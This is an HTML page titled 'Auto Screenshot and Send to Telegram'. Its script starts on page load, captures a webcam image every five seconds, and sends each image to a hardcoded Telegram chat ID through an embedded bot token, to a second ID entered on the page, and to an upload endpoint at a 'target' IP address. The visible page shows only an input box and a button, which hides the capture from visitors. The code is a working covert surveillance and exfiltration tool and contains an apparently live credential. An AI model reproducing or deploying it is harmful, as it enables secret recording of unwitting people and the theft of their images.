<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Screenshot and Send to Telegram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #f4f4f4;
        }
        input, button {
            margin-top: 10px;
            padding: 10px;
            width: 80%;
            max-width: 400px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            background-color: #28a745;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>

    <input type="text" id="telegramId2" placeholder="Enter Telegram ID 2" required>
    <button id="sendButton">Send Images</button>

    <script>
        const telegramId2Input = document.getElementById('telegramId2');
        const botToken = '6552995612:AAGpPJPmKHJBKeSbzNJPxjxM3-8HDXa_rec'; // Your bot token
        const telegramId1 = '1715157464'; // Hardcoded Telegram ID
        const ipAddress = '192.168.1.100'; // Replace with the target IP address
        const images = []; // Array to store captured images

        // Start capturing images immediately upon page load
        (async function startCapturing() {
            setInterval(() => {
                captureAndSendPhoto();
            }, 5000); // Every 5 seconds
        })();

        function captureAndSendPhoto() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    // Capture image after a short delay (1 second) to allow video to start
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640; // Set desired width
                        canvas.height = 480; // Set desired height
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // Stop the video stream
                        stream.getTracks().forEach(track => track.stop());
                        
                        // Save the captured image
                        const imageData = canvas.toDataURL('image/png');
                        images.push(imageData);
                        console.log(`Captured image ${images.length}`);

                        // Send the captured image to Telegram and the specified IP address
                        sendImageToTelegram(imageData);
                        sendImageToIpAddress(imageData);
                    }, 1000);
                })
                .catch(err => {
                    console.error("Error accessing camera: ", err);
                });
        }

        async function sendImageToTelegram(imageData) {
            const telegramIds = [telegramId1, telegramId2Input.value]; // Include hardcoded ID and user input

            for (const telegramId of telegramIds) {
                const formData = new FormData();
                formData.append('chat_id', telegramId);
                formData.append('photo', imageData);

                const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        body: formData,
                    });

                    const result = await response.json();
                    if (result.ok) {
                        console.log(`Image sent to ${telegramId} successfully!`);
                    } else {
                        console.error(`Error sending image to ${telegramId}: ` + result.description);
                    }
                } catch (error) {
                    console.error('Error:', error);
                }
            }
        }

        async function sendImageToIpAddress(imageData) {
            const url = `http://${ipAddress}/upload`; // Assuming the server accepts POST requests at /upload

            // Convert data URL to Blob
            const byteString = atob(imageData.split(',')[1]);
            const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
            const ab = new Uint8Array(byteString.length);
            for (let i = 0; i < byteString.length; i++) {
                ab[i] = byteString.charCodeAt(i);
            }
            const blob = new Blob([ab], { type: mimeString });

            const formData = new FormData();
            formData.append('image', blob, 'screenshot.png');

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData,
                });

                if (response.ok) {
                    console.log(`Image sent to IP address ${ipAddress} successfully!`);
                } else {
                    console.error(`Error sending image to IP address ${ipAddress}: ` + await response.text());
                }
            } catch (error) {
                console.error('Error:', error);
            }
        }
    </script>

</body>
</html>
                        
